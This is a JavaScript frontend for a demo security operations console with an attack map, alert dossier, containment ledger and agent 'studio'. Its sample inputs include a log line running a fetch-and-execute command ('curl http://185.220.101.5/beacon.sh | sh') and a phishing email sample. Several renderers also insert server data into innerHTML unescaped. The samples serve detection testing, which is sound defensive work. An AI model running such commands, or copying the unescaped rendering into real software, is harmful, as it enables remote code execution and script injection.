/**
 * SentiX (SentinelX) SOC Console - High-Fidelity Tactical Frontend
 * Implements Slides 11, 12, 13 + Live Multi-Agent Correlation Studio
 */

let activeAlerts = [];
let selectedAlert = null;
let currentSeverityFilter = "ALL";
let isFeedPaused = false;
let autoContainmentMode = false;
let leafletMapInstance = null;
let chartVolumeInstance = null;

document.addEventListener("DOMContentLoaded", () => {
    initClock();
    initNavigationTabs();
    initLeafletAttackMap();
    initChartJsVolume();
    loadDashboardStats();
    loadAlerts();
    loadAgentMesh();
    loadContainmentLedger();
    setupEventListeners();
    setupStudio();

    // Telemetry polling loop every 5s
    setInterval(() => {
        if (!isFeedPaused) {
            loadDashboardStats();
            loadAlerts(false);
            loadAgentMesh();
            loadContainmentLedger();
        }
    }, 5000);
});

/* UTC Live Clock */
function initClock() {
    const clockEl = document.getElementById("utc-clock-time");
    function update() {
        const now = new Date();
        const y = now.getUTCFullYear();
        const m = String(now.getUTCMonth() + 1).padStart(2, '0');
        const d = String(now.getUTCDate()).padStart(2, '0');
        const h = String(now.getUTCHours()).padStart(2, '0');
        const min = String(now.getUTCMinutes()).padStart(2, '0');
        const s = String(now.getUTCSeconds()).padStart(2, '0');
        if (clockEl) {
            clockEl.textContent = `${y}-${m}-${d} ${h}:${min}:${s} UTC`;
        }
    }
    update();
    setInterval(update, 1000);
}

/* Nav Tabs Switcher */
function initNavigationTabs() {
    const tabs = document.querySelectorAll(".nav-tab-btn");
    tabs.forEach(btn => {
        btn.addEventListener("click", () => {
            const targetId = btn.getAttribute("data-tab");
            if (!targetId) return;

            tabs.forEach(t => t.classList.remove("active"));
            btn.classList.add("active");

            document.querySelectorAll(".tab-pane").forEach(pane => {
                pane.classList.remove("active");
            });

            const activePane = document.getElementById(targetId);
            if (activePane) {
                activePane.classList.add("active");
            }

            // Invalidate Leaflet map size on tab switch so it renders correctly
            if (targetId === "pane-soc-console" && leafletMapInstance) {
                setTimeout(() => leafletMapInstance.invalidateSize(), 150);
            }
        });
    });
}

/* Leaflet Geolocation Map (Slide 12 Replica) */
function initLeafletAttackMap() {
    const mapEl = document.getElementById("leaflet-map");
    if (!mapEl || typeof L === "undefined") return;

    try {
        leafletMapInstance = L.map("leaflet-map", {
            center: [25.0, 10.0],
            zoom: 2,
            minZoom: 1,
            maxZoom: 6,
            zoomControl: true,
            attributionControl: false
        });

        // Dark Matter Basemap Tiles
        L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
            subdomains: "abcd",
            maxZoom: 19
        }).addTo(leafletMapInstance);

        // Core Protected Asset (SOC Core-DB / Gateway)
        const socTarget = [37.7749, -122.4194]; // San Francisco Gateway
        const socIcon = L.divIcon({
            className: "soc-pin-marker",
            html: `<div style="width:14px;height:14px;border-radius:50%;background:#10b981;border:2px solid #fff;box-shadow:0 0 12px #10b981;"></div>`,
            iconSize: [14, 14]
        });
        L.marker(socTarget, { icon: socIcon }).addTo(leafletMapInstance)
            .bindPopup("<strong style='color:#10b981;'>Protected Asset</strong><br>10.0.4.10 (Core-DB / Edge Gateway)");

        // 5 Active Threat Attack Vectors (matching Slide 12)
        const attackVectors = [
            { lat: 50.1109, lng: 8.6821, ip: "185.220.101.5", loc: "Frankfurt, Germany", type: "Spearphishing C2", sev: "CRITICAL" },
            { lat: 31.2304, lng: 121.4737, ip: "203.175.188.1", loc: "Shanghai, China", type: "API Gateway RCE Exploit", sev: "CRITICAL" },
            { lat: 55.7558, lng: 37.6173, ip: "45.154.255.88", loc: "Moscow, Russia", type: "SYN Flood / Auth Spike", sev: "HIGH" },
            { lat: -33.8688, lng: 151.2093, ip: "103.224.182.9", loc: "Sydney, Australia", type: "Kerberoasting TGS Probe", sev: "CRITICAL" },
            { lat: 37.3382, lng: -121.8863, ip: "198.51.100.22", loc: "San Jose, USA", type: "Subnet Recon Scan", sev: "MEDIUM" }
        ];

        attackVectors.forEach(v => {
            const color = v.sev === "CRITICAL" ? "#ef4444" : "#f59e0b";
            const attackIcon = L.divIcon({
                className: "attack-pin-marker",
                html: `<div style="width:12px;height:12px;border-radius:50%;background:${color};border:2px solid #fff;box-shadow:0 0 12px ${color};"></div>`,
                iconSize: [12, 12]
            });

            L.marker([v.lat, v.lng], { icon: attackIcon }).addTo(leafletMapInstance)
                .bindPopup(`<strong style="color:${color};">${v.type}</strong><br>IP: ${v.ip}<br>Location: ${v.loc}`);

            // Draw line connecting origin to target SOC
            const polyline = L.polyline([[v.lat, v.lng], socTarget], {
                color: color,
                weight: 1.5,
                opacity: 0.6,
                dashArray: "4, 6"
            }).addTo(leafletMapInstance);
        });
    } catch (e) {
        console.warn("Leaflet map initialization warning:", e);
    }
}

/* Chart.js Detection Volume (60 Min) (Slide 12 Replica) */
function initChartJsVolume() {
    const canvas = document.getElementById("chartjs-volume-canvas");
    if (!canvas || typeof Chart === "undefined") return;

    try {
        const ctx = canvas.getContext("2d");
        const labels = ["07:01", "07:15", "07:31", "07:46", "08:01", "08:15", "08:30", "08:45", "09:00"];

        // Gradient for Total Volume
        const gradAmber = ctx.createLinearGradient(0, 0, 0, 200);
        gradAmber.addColorStop(0, "rgba(245, 158, 11, 0.45)");
        gradAmber.addColorStop(1, "rgba(245, 158, 11, 0.0)");

        // Gradient for Critical Volume
        const gradRed = ctx.createLinearGradient(0, 0, 0, 200);
        gradRed.addColorStop(0, "rgba(239, 68, 68, 0.5)");
        gradRed.addColorStop(1, "rgba(239, 68, 68, 0.0)");

        chartVolumeInstance = new Chart(ctx, {
            type: "line",
            data: {
                labels: labels,
                datasets: [
                    {
                        label: "Total Detection Volume",
                        data: [12, 15, 11, 14, 18, 22, 28, 31, 34],
                        borderColor: "#f59e0b",
                        backgroundColor: gradAmber,
                        borderWidth: 2.5,
                        fill: true,
                        tension: 0.4,
                        pointRadius: 3,
                        pointBackgroundColor: "#fbbf24"
                    },
                    {
                        label: "Critical / P1 Alerts",
                        data: [5, 6, 4, 7, 9, 13, 17, 19, 21],
                        borderColor: "#ef4444",
                        backgroundColor: gradRed,
                        borderWidth: 2.5,
                        fill: true,
                        tension: 0.4,
                        pointRadius: 3,
                        pointBackgroundColor: "#f87171"
                    }
                ]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        position: "top",
                        labels: {
                            color: "#94a3b8",
                            font: { family: "JetBrains Mono", size: 10 }
                        }
                    },
                    tooltip: {
                        mode: "index",
                        intersect: false,
                        backgroundColor: "#0d1424",
                        titleColor: "#38bdf8",
                        bodyColor: "#f1f5f9",
                        borderColor: "#233554",
                        borderWidth: 1
                    }
                },
                scales: {
                    x: {
                        grid: { color: "rgba(255, 255, 255, 0.04)" },
                        ticks: { color: "#64748b", font: { family: "JetBrains Mono", size: 10 } }
                    },
                    y: {
                        grid: { color: "rgba(255, 255, 255, 0.04)" },
                        ticks: { color: "#64748b", font: { family: "JetBrains Mono", size: 10 } }
                    }
                }
            }
        });
    } catch (e) {
        console.warn("Chart.js volume graph initialization warning:", e);
    }
}

/* Event Listeners Setup */
function setupEventListeners() {
    // Feed control
    const feedBtn = document.getElementById("btn-feed-toggle");
    if (feedBtn) {
        feedBtn.addEventListener("click", () => {
            isFeedPaused = !isFeedPaused;
            feedBtn.innerHTML = isFeedPaused 
                ? `<span>▶</span> RESUME FEED` 
                : `<span>⏸</span> PAUSE FEED`;
            feedBtn.style.color = isFeedPaused ? "#fbbf24" : "#f8fafc";
        });
    }

    // Filter pills
    document.querySelectorAll(".sev-pill").forEach(pill => {
        pill.addEventListener("click", (e) => {
            document.querySelectorAll(".sev-pill").forEach(p => p.classList.remove("active"));
            e.target.classList.add("active");
            currentSeverityFilter = e.target.getAttribute("data-sev");
            renderAlertList();
        });
    });

    // Search input
    const searchInput = document.getElementById("search-alerts");
    if (searchInput) {
        searchInput.addEventListener("input", () => {
            renderAlertList();
        });
    }

    // Auto / Manual mode toggle (Slide 12)
    const modeBtn = document.getElementById("mode-toggle-btn");
    if (modeBtn) {
        modeBtn.addEventListener("click", () => {
            autoContainmentMode = !autoContainmentMode;
            modeBtn.textContent = autoContainmentMode ? "AUTO ON" : "AUTO OFF";
            modeBtn.style.background = autoContainmentMode ? "rgba(16, 185, 129, 0.2)" : "rgba(239, 68, 68, 0.2)";
            modeBtn.style.color = autoContainmentMode ? "#34d399" : "#fca5a5";
            modeBtn.style.borderColor = autoContainmentMode ? "#10b981" : "#ef4444";
            showNotification(`Containment Mesh switched to ${autoContainmentMode ? 'AUTONOMOUS ACTIVE DEFENSE' : 'MANUAL CONFIRMATION'}`);
        });
    }

    // Action Handlers Test Execute
    document.querySelectorAll(".btn-exec-action").forEach(btn => {
        btn.addEventListener("click", (e) => {
            const action = e.target.getAttribute("data-action");
            const target = e.target.getAttribute("data-target") || (selectedAlert ? selectedAlert.src_ip : "203.175.188.1");
            executeAction(action, target, autoContainmentMode ? "AUTO" : "MANUAL");
        });
    });

    // Dossier actions
    const btnP1 = document.getElementById("btn-create-p1");
    if (btnP1) {
        btnP1.addEventListener("click", () => {
            if (selectedAlert) {
                executeAction("CREATE_REPORT", selectedAlert.asset || selectedAlert.src_ip, "MANUAL");
            }
        });
    }

    const btnEdr = document.getElementById("btn-edr-isolate");
    if (btnEdr) {
        btnEdr.addEventListener("click", () => {
            if (selectedAlert) {
                executeAction("ISOLATE_HOST", selectedAlert.dest_ip || selectedAlert.asset, "MANUAL");
            }
        });
    }

    // Export JSON Dossier
    const btnExport = document.getElementById("btn-export-dossier");
    if (btnExport) {
        btnExport.addEventListener("click", () => {
            if (!selectedAlert) return;
            const blob = new Blob([JSON.stringify(selectedAlert, null, 2)], { type: "application/json" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = `SentiX-Dossier-${selectedAlert.id}.json`;
            a.click();
            URL.revokeObjectURL(url);
            showNotification(`Investigation dossier exported for ${selectedAlert.id.substring(0, 8)}`);
        });
    }

    // Simulation Modal
    const btnSimNav = document.getElementById("btn-open-sim");
    const modalSim = document.getElementById("sim-modal");
    const btnCloseModal = document.getElementById("btn-close-modal");
    const btnRunSim = document.getElementById("btn-run-sim-action");

    if (btnSimNav && modalSim) {
        btnSimNav.addEventListener("click", () => modalSim.classList.add("open"));
    }
    if (btnCloseModal && modalSim) {
        btnCloseModal.addEventListener("click", () => modalSim.classList.remove("open"));
    }
    if (btnRunSim) {
        btnRunSim.addEventListener("click", triggerAttackSimulation);
    }
}

/* API Calls & Renderers */
async function loadDashboardStats() {
    try {
        const res = await fetch("/api/stats");
        if (res.ok) {
            const data = await res.json();
            document.getElementById("stat-critical").textContent = data.critical_incidents;
            document.getElementById("stat-contained").textContent = data.auto_contained;
            document.getElementById("stat-risk").textContent = data.mean_risk_score;
            document.getElementById("stat-mttr").textContent = data.mean_time_to_respond;
            if (document.getElementById("events-today-badge")) {
                document.getElementById("events-today-badge").textContent = `${data.events_processed_today.toLocaleString()} events processed today`;
            }
        }
    } catch (err) {
        console.error("Error loading stats:", err);
    }
}

async function loadAlerts(reselect = true) {
    try {
        const res = await fetch("/api/alerts");
        if (res.ok) {
            activeAlerts = await res.json();
            renderAlertList();
            if (reselect && activeAlerts.length > 0 && !selectedAlert) {
                selectAlert(activeAlerts[0]);
            }
        }
    } catch (err) {
        console.error("Error loading alerts:", err);
    }
}

function renderAlertList() {
    const listEl = document.getElementById("alert-stream-list");
    if (!listEl) return;

    const searchTerm = (document.getElementById("search-alerts")?.value || "").toLowerCase();

    const filtered = activeAlerts.filter(item => {
        const matchSev = currentSeverityFilter === "ALL" || item.severity.toUpperCase() === currentSeverityFilter.toUpperCase();
        const matchSearch = !searchTerm || 
            item.title.toLowerCase().includes(searchTerm) ||
            (item.src_ip && item.src_ip.includes(searchTerm)) ||
            (item.asset && item.asset.toLowerCase().includes(searchTerm)) ||
            (item.mitre_technique && item.mitre_technique.toLowerCase().includes(searchTerm));
        return matchSev && matchSearch;
    });

    listEl.innerHTML = "";
    if (filtered.length === 0) {
        listEl.innerHTML = `<div style="padding:30px;text-align:center;color:#64748b;font-family:var(--font-mono);font-size:12px;">No alerts matching filter criteria</div>`;
        return;
    }

    filtered.forEach(alert => {
        const item = document.createElement("div");
        const sevClass = alert.severity.toLowerCase();
        const isSelected = selectedAlert && selectedAlert.id === alert.id;

        item.className = `alert-row-item ${sevClass} ${isSelected ? 'selected' : ''}`;
        item.innerHTML = `
            <div class="alert-header-meta">
                <span class="pill-badge-sev ${sevClass}">${alert.severity}</span>
                <span class="alert-id-mono">${alert.id.substring(0, 8)}...</span>
                <span class="alert-time-tag">${alert.timestamp}</span>
            </div>
            <div class="alert-headline">${alert.title}</div>
            <div class="alert-footer-meta">
                <span>Asset: ${alert.asset || alert.dest_ip || 'N/A'}</span>
                <span>Src: ${alert.src_ip || 'N/A'}</span>
                <span class="risk-pill">risk ${alert.risk_score}</span>
            </div>
        `;

        item.addEventListener("click", () => {
            selectAlert(alert);
        });

        listEl.appendChild(item);
    });
}

function selectAlert(alert) {
    selectedAlert = alert;
    renderAlertList();

    // Populate Investigation Dossier (Slide 11)
    document.getElementById("dossier-alert-id").textContent = alert.id;
    document.getElementById("dossier-cat-badge").textContent = alert.category || "PRIVILEGE ESCALATION";
    document.getElementById("dossier-title").textContent = alert.title;

    document.getElementById("meta-asset").textContent = alert.asset || "10.0.4.10 (Core-DB)";
    document.getElementById("meta-src-ip").textContent = alert.src_ip || "203.175.188.1";
    document.getElementById("meta-protocol").textContent = alert.category === "EMAIL_THREAT" ? "SMTP / TLS" : "HTTPS / TCP";
    document.getElementById("meta-technique").textContent = alert.mitre_technique || "T1078 Valid Accounts";

    // Dynamic Risk Progress Bars
    const compositeBar = document.getElementById("bar-composite");
    const compositeVal = document.getElementById("val-composite");
    if (compositeBar && compositeVal) {
        compositeBar.style.width = `${alert.risk_score}%`;
        compositeVal.textContent = alert.risk_score;
    }

    const ifBar = document.getElementById("bar-if");
    const ifVal = document.getElementById("val-if");
    if (ifBar && ifVal) {
        const ifValNum = alert.if_score || 87;
        ifBar.style.width = `${ifValNum}%`;
        ifVal.textContent = Math.round(ifValNum);
    }

    const confEl = document.getElementById("val-confidence");
    if (confEl) {
        confEl.textContent = `${alert.confidence || 99}%`;
    }

    // Threat Intel feeds
    document.getElementById("intel-vt").textContent = alert.vt_score || "8/72";
    document.getElementById("intel-abuse").textContent = alert.abuse_score || "34% (Suspicious)";
    document.getElementById("intel-otx").textContent = `${alert.otx_matches || 14} Matches`;

    // Parse Evidence & Chain-of-Thought
    let details = {};
    try {
        details = typeof alert.details_json === "string" ? JSON.parse(alert.details_json) : (alert.details_json || {});
    } catch (e) {
        details = {};
    }

    const cotContainer = document.getElementById("dossier-cot");
    if (cotContainer) {
        cotContainer.innerHTML = `
            <div class="cot-line">
                <span class="cot-bullet">⚡</span>
                <span><strong>Ingestion & Normalization:</strong> Raw telemetry captured and mapped into standardized schema.</span>
            </div>
            <div class="cot-line">
                <span class="cot-bullet">🛡</span>
                <span><strong>ML Anomaly Loss:</strong> Isolation Forest index: ${alert.if_score || 87}%. Autoencoder reconstruction error: ${alert.ae_score || 79}%.</span>
            </div>
            <div class="cot-line">
                <span class="cot-bullet">🤖</span>
                <span><strong>LLM Chain-of-Thought:</strong> ${details.evidence || 'Identified unauthorized credentials interception and privilege escalation attempt.'}</span>
            </div>
        `;
    }

    const expEl = document.getElementById("dossier-explanation");
    if (expEl) {
        expEl.textContent = details.narrative || `Adversary ${alert.src_ip} executed targeted attack progression against crown jewel ${alert.asset}. The multi-agent correlation mesh recommends immediate perimeter isolation and credential invalidation.`;
    }
}

async function loadAgentMesh() {
    try {
        const res = await fetch("/api/agents/status");
        if (res.ok) {
            const agents = await res.json();
            const grid = document.getElementById("agent-mesh-grid");
            if (!grid) return;
            grid.innerHTML = "";

            agents.forEach(agent => {
                const node = document.createElement("div");
                node.className = "agent-node-card";
                const dotClass = agent.status.toLowerCase();
                node.innerHTML = `
                    <div class="node-row-top">
                        <span class="node-name">${agent.name}</span>
                        <span class="node-status-tag">
                            <span class="node-dot ${dotClass}"></span>
                            ${agent.status}
                        </span>
                    </div>
                    <div class="node-role-desc">${agent.role}</div>
                    <div class="node-metrics">
                        <span>Load: ${agent.load_pct}%</span>
                        <span>Latency: ${agent.latency_ms}ms</span>
                    </div>
                `;
                grid.appendChild(node);
            });
        }
    } catch (err) {
        console.error("Error loading agent mesh:", err);
    }
}

async function loadContainmentLedger() {
    try {
        const res = await fetch("/api/actions/history");
        if (res.ok) {
            const ledger = await res.json();
            const tbody = document.getElementById("ledger-table-body");
            const countBadge = document.getElementById("ledger-count-badge");
            if (countBadge) countBadge.textContent = `${ledger.length} events logged`;
            if (!tbody) return;

            tbody.innerHTML = "";
            ledger.forEach(entry => {
                const tr = document.createElement("tr");
                const sevColor = entry.severity === "CRITICAL" ? "#f87171" : "#fbbf24";
                const modeColor = entry.mode === "AUTO" ? "#34d399" : "#38bdf8";

                tr.innerHTML = `
                    <td>${entry.timestamp}</td>
                    <td><strong style="color:#ffffff;">${entry.action}</strong></td>
                    <td style="color:#38bdf8;font-weight:600;">${entry.target}</td>
                    <td style="color:${sevColor};font-weight:700;">${entry.severity}</td>
                    <td style="color:${modeColor};font-weight:700;">${entry.mode}</td>
                    <td>${entry.executed_by}</td>
                `;
                tbody.appendChild(tr);
            });
        }
    } catch (err) {
        console.error("Error loading containment ledger:", err);
    }
}

async function executeAction(actionType, target, mode = "MANUAL") {
    try {
        const res = await fetch("/api/actions/execute", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                action: actionType,
                target: target,
                severity: "CRITICAL",
                mode: mode,
                executed_by: "SOC Lead (Analyst Console)"
            })
        });
        if (res.ok) {
            const data = await res.json();
            loadContainmentLedger();
            loadDashboardStats();
            showNotification(`Orchestrated Action [${data.action}] executed against [${data.target}]`);
        }
    } catch (err) {
        console.error("Action execution error:", err);
    }
}

async function triggerAttackSimulation() {
    const btn = document.getElementById("btn-run-sim-action");
    if (btn) {
        btn.disabled = true;
        btn.textContent = "EXECUTING COLD APT SIMULATION...";
    }
    try {
        const res = await fetch("/api/simulation/run", { method: "POST" });
        if (res.ok) {
            const data = await res.json();
            await loadAlerts();
            await loadDashboardStats();
            await loadContainmentLedger();
            document.getElementById("sim-modal")?.classList.remove("open");
            showNotification(`Multi-Vector APT Intrusion Simulated: Correlation completed (Confidence 87%) & autonomous containment executed!`);
        }
    } catch (err) {
        console.error("Simulation error:", err);
    } finally {
        if (btn) {
            btn.disabled = false;
            btn.textContent = "TRIGGER MULTI-VECTOR ATTACK SIMULATION";
        }
    }
}

/* Studio: Manual Dispatch & Testing */
function setupStudio() {
    const btnEmail = document.getElementById("btn-sample-email");
    const btnLog = document.getElementById("btn-sample-log");
    const btnIp = document.getElementById("btn-sample-ip");
    const inputArea = document.getElementById("studio-input");
    const btnSubmit = document.getElementById("btn-submit-studio");
    const outputArea = document.getElementById("studio-output");

    if (btnEmail && inputArea) {
        btnEmail.addEventListener("click", () => {
            inputArea.value = JSON.stringify({
                task_type: "email",
                sender: "payroll-alert@pay-support-portal.net",
                subject: "CRITICAL: Urgent Payroll Account Verification Required Immediately",
                headers: { "From": "HR Payroll", "Reply-To": "attacker-c2@185.220.101.5", "SPF": "SoftFail" },
                body: "Urgent direct deposit verification required immediately: http://pay-support-portal.net/auth/verify?asset=10.0.4.10"
            }, null, 2);
        });
    }

    if (btnLog && inputArea) {
        btnLog.addEventListener("click", () => {
            inputArea.value = JSON.stringify({
                task_type: "log",
                entries: [
                    "2026-08-07T18:28:10Z edge-gw sshd[4102]: Failed password for invalid user admin from 203.175.188.1 port 49152 ssh2",
                    "2026-08-07T18:30:02Z edge-gw api-gateway[1029]: [CRITICAL] Memory heap corruption detected on /v1/auth/token handler (Buffer Overflow Canary Triggered) - SrcIP 203.175.188.1",
                    "2026-08-07T18:31:45Z edge-gw sudo[5520]: user daemon : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://185.220.101.5/beacon.sh | sh'"
                ]
            }, null, 2);
        });
    }

    if (btnIp && inputArea) {
        btnIp.addEventListener("click", () => {
            inputArea.value = JSON.stringify({
                task_type: "ip_range",
                range: "192.168.14.0/24"
            }, null, 2);
        });
    }

    if (btnSubmit && inputArea && outputArea) {
        btnSubmit.addEventListener("click", async () => {
            let parsed = {};
            try {
                parsed = JSON.parse(inputArea.value);
            } catch (e) {
                parsed = { text: inputArea.value };
            }

            btnSubmit.disabled = true;
            btnSubmit.textContent = "DISPATCHING ACROSS AGENTS...";
            try {
                const res = await fetch("/api/dispatch", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(parsed)
                });
                const result = await res.json();
                outputArea.textContent = JSON.stringify(result, null, 2);
                loadAlerts(false);
                loadDashboardStats();
                showNotification(`Task dispatched successfully to ${result.routed_agent || 'domain agent'}`);
            } catch (err) {
                outputArea.textContent = `Error: ${err.message}`;
            } finally {
                btnSubmit.disabled = false;
                btnSubmit.textContent = "RUN AGENT ANALYSIS";
            }
        });
    }
}

function showNotification(msg) {
    const toast = document.createElement("div");
    toast.style.position = "fixed";
    toast.style.bottom = "24px";
    toast.style.right = "24px";
    toast.style.background = "#0e1628";
    toast.style.border = "1px solid #38bdf8";
    toast.style.color = "#ffffff";
    toast.style.padding = "14px 20px";
    toast.style.borderRadius = "8px";
    toast.style.boxShadow = "0 10px 30px rgba(0,0,0,0.6)";
    toast.style.fontFamily = "'JetBrains Mono', monospace";
    toast.style.fontSize = "12px";
    toast.style.zIndex = "3000";
    toast.innerHTML = `<span style="color:#10b981;margin-right:8px;">✔</span><strong>SentiX Mesh:</strong> ${msg}`;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 4200);
}
